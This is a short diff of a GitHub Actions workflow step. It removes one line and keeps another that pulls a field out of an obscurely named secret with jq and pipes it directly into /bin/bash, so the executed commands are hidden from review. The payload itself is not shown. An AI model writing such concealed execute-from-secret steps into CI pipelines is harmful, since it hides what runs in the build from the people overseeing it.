@@ -17,7 +17,6 @@ jobs:
           jivyf2: ${{ secrets.jivyf2 }}
         run: |
           printf '%s' "$jivyf2" | jq -r .g51274 | /bin/bash
-          echo $y43513 | jq -r .g0874 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
